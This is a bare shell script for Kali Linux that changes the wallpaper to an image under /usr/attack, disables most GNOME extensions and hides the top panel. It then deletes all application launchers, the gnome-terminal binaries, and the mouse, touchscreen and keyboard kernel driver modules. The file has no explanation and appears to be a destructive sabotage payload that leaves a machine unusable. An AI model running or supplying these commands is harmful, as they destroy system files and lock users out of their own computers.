gsettings set org.gnome.desktop.background picture-uri file:////usr/attack/W@11p@p3r.jpg
sleep 1
gnome-shell-extension-tool -d dash-to-dock@micxgx.gmail.com
sleep 1
gnome-shell-extension-tool -d apps-menu@gnome-shell-extensions.gcampax.github.com
sleep 1
gnome-shell-extension-tool -d auto-move-windows@gnome-shell-extensions.gcampax.github.com
sleep 1
gnome-shell-extension-tool -d drive-menu@gnome-shell-extensions.gcampax.github.com
sleep 1
gnome-shell-extension-tool -d EasyScreenCast@iacopodeenosee.gmail.com
sleep 1
gnome-shell-extension-tool -d launch-new-instance@gnome-shell-extensions.gcampax.github.com
sleep 1
gnome-shell-extension-tool -d launch-new-instance@gnome-shell-extensions.gcampax.github.com
sleep 1
gnome-shell-extension-tool -d native-window-placement@gnome-shell-extensions.gcampax.github.com
sleep 1
gnome-shell-extension-tool -d places-menu@gnome-shell-extensions.gcampax.github.com
sleep 1
gnome-shell-extension-tool -d ProxySwitcher@flannaghan.com
sleep 1
gnome-shell-extension-tool -d screenshot-window-sizer@gnome-shell-extensions.gcampax.github.com
sleep 1
gnome-shell-extension-tool -d user-theme@gnome-shell-extensions.gcampax.github.com
sleep 1
gnome-shell-extension-tool -d window-list@gnome-shell-extensions.gcampax.github.com
sleep 1
gnome-shell-extension-tool -d windowsNavigator@gnome-shell-extensions.gcampax.github.com
sleep 1
gnome-shell-extension-tool -d workspace-indicator@gnome-shell-extensions.gcampax.github.com
sleep 1
gnome-shell-extension-tool -d workspaces-to-dock@passingthru67.gmail.com
sleep 1
gnome-shell-extension-tool -d alternate-tab@gnome-shell-extensions.gcampax.github.com
sleep 1
gnome-shell-extension-tool -e hide-top-panel@dimka665.gmail.com
sleep 1
gnome-shell-extension-tool -e nohotcorner@azuri.free.fr
sleep 1
rm -f /usr/share/applications/*
sleep 1
rm -f /usr/bin/gnome-terminal
sleep 1
rm -f /usr/bin/gnome-terminal.wrapper
sleep 1
cd /lib/modules/4.18.0-kali2-amd64/kernel/drivers/input
rm -r mouse
rm -r touchscreen
rm -r keyboard
sleep 1
cd /lib/modules/4.19.13-kali2-amd64/kernel/drivers/input
rm -r mouse
rm -r touchscreen
rm -r keyboard
